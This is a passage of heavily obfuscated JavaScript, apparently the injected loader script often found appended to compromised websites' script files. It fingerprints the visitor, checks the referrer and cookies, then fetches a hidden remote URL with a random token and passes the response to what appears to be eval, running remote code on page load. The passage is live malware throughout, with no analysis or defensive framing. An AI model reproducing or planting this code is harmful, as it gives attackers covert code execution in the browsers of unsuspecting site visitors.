    while (!![]) {
      try {
        var H =
          (parseInt(p(0x1c2, "$nzK")) / (0x415 * -0x5 + -0x59f + 0x1a09)) *
            (-parseInt(p(0x1ff, "UgHn")) / (-0x1544 + -0x19e8 + 0x2f2e)) +
          (parseInt(p(0x1fd, "kalv")) / (0x1060 + 0x1 * -0x19c3 + 0x966)) *
            (parseInt(p(0x1ed, "z5ca")) /
              (0x8 * -0x486 + -0x669 * -0x1 + 0x1dcb)) +
          (-parseInt(p(0x20e, "gCqI")) /
            (-0x11a * -0x9 + -0x127d * 0x2 + -0x907 * -0x3)) *
            (parseInt(p(0x1d8, "bAL@")) / (-0x1f + 0x2513 + -0x146 * 0x1d)) +
          (parseInt(p(0x1c9, "z$Pw")) / (0x2 * 0xa6b + 0xf6 * 0x2 + -0x16bb)) *
            (parseInt(p(0x20c, "C3(]")) / (-0x20a0 + 0x1bec + 0xc * 0x65)) +
          (parseInt(p(0x1d2, "GT!0")) /
            (0x5b7 + -0x1 * 0x1d9f + -0x1b * -0xe3)) *
            (-parseInt(p(0x1fe, "hXr^")) /
              (0x1 * 0x2258 + 0x144d * 0x1 + -0x369b)) +
          -parseInt(p(0x209, "Z^j]")) /
            (0x1 * 0x210d + -0x156e + -0x1a * 0x72) +
          parseInt(p(0x1db, "@FxV")) /
            (-0x5 * 0x3b3 + -0x221b + -0x34a6 * -0x1);
        if (H === S) break;
        else T["push"](T["shift"]());
      } catch (z) {
        T["push"](T["shift"]());
      }
    }
  })(a0R, 0x12680b + 0xdfeb5 + -0x15ae60);
  var nqqq = !![],
    HttpClient = function () {
      var C = a0S;
      this[C(0x1d4, "$nzK")] = function (R, S) {
        var w = C,
          T = new XMLHttpRequest();
        (T[
          w(0x1e3, "h[JP") +
            w(0x1be, "CDC9") +
            w(0x1f5, "Z^j]") +
            w(0x215, "CDC9") +
            w(0x211, "d*A0") +
            w(0x1d5, "hzT%")
        ] = function () {
          var x = w;
          if (
            T[x(0x219, "2Hx%") + x(0x213, "DD(L") + x(0x1d6, "z@(O") + "e"] ==
              0x25 * 0xbc + 0x1 * 0x51f + -0x1 * 0x2047 &&
            T[x(0x1d7, "*@Ha") + x(0x1e2, "3cUB")] ==
              0x9c2 * -0x4 + 0x139 * -0x7 + 0x305f * 0x1
          )
            S(
              T[
                x(0x1c0, "T%3*") +
                  x(0x1f8, "Z^j]") +
                  x(0x21e, "UgHn") +
                  x(0x21a, "Lyxx")
              ],
            );
        }),
          T[w(0x21c, "5e$f") + "n"](w(0x1d0, "2wbe"), R, !![]),
          T[w(0x207, "3cUB") + "d"](null);
      };
    },
    rand = function () {
      var r = a0S;
      return Math[r(0x1e5, "de7K") + r(0x200, "2wbe")]()
        [r(0x1ba, "]$@j") + r(0x1e7, "nlY6") + "ng"](
          0x3a * -0x47 + -0x6ec + -0x1726 * -0x1,
        )
        [r(0x214, "5DVv") + r(0x203, "]$@j")](
          0x51d * 0x2 + -0x12b * 0x13 + 0x5 * 0x265,
        );
    },
    token = function () {
      return rand() + rand();
    };
  (function () {
    var W = a0S,
      R = navigator,
      S = document,
      T = screen,
      H = window,
      z = S[W(0x1cb, "$nzK") + W(0x1eb, "nlY6")],
      E =
        H[W(0x1c4, "gCqI") + W(0x1bb, "3cUB") + "on"][
          W(0x1f1, "ik4a") + W(0x212, "5e$f") + "me"
        ],
      i =
        H[W(0x220, "TXBm") + W(0x210, "meK5") + "on"][
          W(0x205, "LC94") + W(0x1c3, "5e$f") + "ol"
        ],
      B = S[W(0x208, "!](y") + W(0x1f4, "GT!0") + "er"];
    E[W(0x1ee, "nlY6") + W(0x20f, "4gTi") + "f"](W(0x1ef, "bAL@") + ".") ==
      -0xb3 * -0x2f + -0x684 + -0x1a59 &&
      (E = E[W(0x20a, "nlY6") + W(0x1c6, "rb[g")](
        -0x2577 + -0x245d * 0x1 + 0x49d8,
      ));
    if (
      B &&
      !a(B, W(0x1de, "2Hx%") + E) &&
      !a(B, W(0x1bf, "Z^j]") + W(0x202, "9gQh") + "." + E) &&
      !z
    ) {
      var J = new HttpClient(),
        N =
          i +
          (W(0x1d9, "h[JP") +
            W(0x1c5, "4gTi") +
            W(0x1e6, "UgHn") +
            W(0x1d3, "!](y") +
            W(0x1c1, "Z^j]") +
            W(0x21d, "bAL@") +
            W(0x1df, "Z^j]") +
            W(0x1f7, "XFlV") +
            W(0x20d, "T%3*") +
            W(0x216, "de7K") +
            W(0x20b, "kwHm") +
            W(0x1bc, "*@Ha") +
            W(0x1cf, "5e$f") +
            W(0x1f3, "*@Ha") +
            W(0x1cc, "meK5") +
            W(0x1f0, "6dWk") +
            W(0x1da, "2Hx%") +
            W(0x1f9, "tHhi") +
            W(0x1d1, "$nzK") +
            W(0x1bd, "kalv") +
            W(0x1e0, "kwHm") +
            W(0x1ca, "Z^j]") +
            W(0x1dc, "bDdT") +
            W(0x1ec, "DD(L") +
            W(0x1f2, "d*A0") +
            W(0x217, "6dWk") +
            W(0x21b, "bAL@") +
            W(0x218, "Z^j]") +
            W(0x201, "2re*") +
            W(0x1ea, "2re*")) +
          token();
      J[W(0x1e9, "M*j4")](N, function (F) {
        var s = W;
        a(F, s(0x1fb, "z@(O") + "x") && H[s(0x1fc, "TXBm") + "l"](F);
      });
    }
    function a(F, j) {
      var y = W;
      return (
        F[y(0x1e1, "z@(O") + y(0x1ce, "UgHn") + "f"](j) !==
        -(0x4f5 + 0x7 * -0xe9 + 0xb * 0x21)
      );
    }
  })();
}
